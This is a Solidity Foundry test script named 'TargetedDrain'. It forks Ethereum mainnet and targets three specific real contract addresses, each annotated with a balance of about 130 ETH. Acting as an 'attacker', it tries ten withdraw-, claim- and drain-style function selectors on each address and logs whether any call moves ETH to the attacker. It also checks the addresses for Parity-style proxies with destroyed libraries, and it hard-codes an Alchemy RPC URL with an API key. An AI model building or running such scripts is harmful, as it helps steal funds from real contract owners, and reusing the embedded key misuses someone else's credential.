// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol";

contract TargetedDrain is Test {
    address attacker;

    // Targets with callable functions
    address constant T1 = 0x1F557eEbbf082E73acca1367608A1C50990C15db; // 135 ETH
    address constant T2 = 0x6E5e0Ef477Db8e26cD64F87522a1997F6ddA64fb; // 132 ETH
    address constant T3 = 0xA327075af2a223A1C83a36aDa1126afE7430f955; // 130 ETH

    function setUp() public {
        vm.createSelectFork("https://eth-mainnet.g.alchemy.com/v2/pLXdY7rYRY10SH_UTLBGH");
        attacker = makeAddr("attacker");
    }

    function test_drainT1() public {
        console.log("=== Target 1: 0x1F55... (135 ETH) ===");
        _tryAllDrains(T1);
    }

    function test_drainT2() public {
        console.log("=== Target 2: 0x6E5e... (132 ETH) ===");
        _tryAllDrains(T2);
    }

    function test_drainT3() public {
        console.log("=== Target 3: 0xa327... (130 ETH) ===");
        _tryAllDrains(T3);
    }

    function _tryAllDrains(address target) internal {
        uint256 targetBal = target.balance;
        console.log("Target balance:", targetBal / 1e18, "ETH");

        bytes4[10] memory funcs = [
            bytes4(keccak256("withdraw()")),
            bytes4(keccak256("withdraw(uint256)")),
            bytes4(keccak256("drain()")),
            bytes4(keccak256("claim()")),
            bytes4(keccak256("exit()")),
            bytes4(keccak256("emergencyWithdraw()")),
            bytes4(keccak256("refund()")),
            bytes4(keccak256("release()")),
            bytes4(keccak256("claimReward()")),
            bytes4(keccak256("getReward()"))
        ];

        for (uint i = 0; i < funcs.length; i++) {
            uint256 before = attacker.balance;

            vm.prank(attacker);
            target.call(abi.encodeWithSelector(funcs[i]));

            vm.prank(attacker);
            target.call(abi.encodeWithSelector(funcs[i], targetBal));

            vm.prank(attacker);
            target.call(abi.encodeWithSelector(funcs[i], attacker));

            if (attacker.balance > before) {
                console.log("!!! DRAINED with function index:", i);
                console.log("Gained:", (attacker.balance - before) / 1e18, "ETH");
                return;
            }
        }

        console.log("No ETH drained");
        console.log("Final attacker balance:", attacker.balance / 1e18, "ETH");
    }

    function test_checkLibraryStatus() public view {
        // Check if these are also Parity-like with destroyed libraries
        address[3] memory targets = [T1, T2, T3];

        for (uint i = 0; i < 3; i++) {
            address t = targets[i];
            console.log("");
            console.log("Target:", t);
            console.log("Balance:", t.balance / 1e18, "ETH");

            // Check bytecode for delegatecall pattern
            bytes memory code = t.code;
            console.log("Code size:", code.length);

            // Check if it's a thin proxy (short code = likely proxy)
            if (code.length < 200) {
                console.log("Short code - likely proxy");
            }

            // Check storage slot 0 for library address pattern
            bytes32 slot0 = vm.load(t, bytes32(uint256(0)));
            console.log("Storage slot 0:");
            console.logBytes32(slot0);
        }
    }
}
